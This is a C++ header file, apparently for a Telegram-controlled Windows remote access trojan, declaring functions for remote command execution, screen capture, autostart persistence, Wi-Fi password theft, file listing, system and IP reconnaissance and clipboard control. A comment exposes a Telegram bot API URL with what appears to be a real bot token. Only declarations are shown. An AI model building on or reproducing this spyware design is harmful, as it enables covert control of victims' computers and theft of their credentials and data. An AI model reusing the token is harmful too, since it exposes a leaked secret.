#define WIN32_LEAN_AND_MEAN
#define TELEGRAM_MAX 4096
#include <iostream>
#include <string>
#include <fstream>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vector>
#include <atlimage.h>
#include <winternl.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <iomanip>
#include <windows.h>
#include <filesystem>
#include <thread>
#include <opencv2/opencv.hpp> 
#include <nlohmann/json.hpp>
#include <cpr/cpr.h>

#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std;
using json = nlohmann::json;
using namespace cv;

//DEFINITIONS IN FEATURES.CPP
extern string ID;
extern const string BOT_API; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
extern const string CHAT_ID;
extern const string VERSION;

inline bool filexits(const string& name);

json bad_json();

json GetLastMessage();

int ChangeVolume(double nVolume = -1, bool bScalar = 0);

void setID(string newID);

void press(char a, bool bigone = 0);

string get_exe();

string get_path();


string url_encode(const string& value);

void Send(string to_send);
void SendPhoto(string path);

string exec(const char* cmd);


void ListIpAddresses();

BOOL IsProcessElevated();

string uptime();

string hostname();

string public_ip();
string admin_rights();

string Cursor_Position();

string DiskList();

string getStatus();

string random_string(int lenght);
void autostart();

void hotkeys(string hotkey);

void logo();

double time_lenght(time_t start, time_t stop);

void Remove(string path);

void startup();


void help(string parameters);

BITMAPINFOHEADER createBitmapHeader(int width, int height);

Mat captureScreenMat(HWND hwnd);

bool is_path(const string& path);

string ListOfFiles(string path);

string get_ListOfWifiPasswords();
void CloseForeground();

void StartStopClosingForeground(bool switcH);

void toClipboard(HWND hwnd, const std::string& s);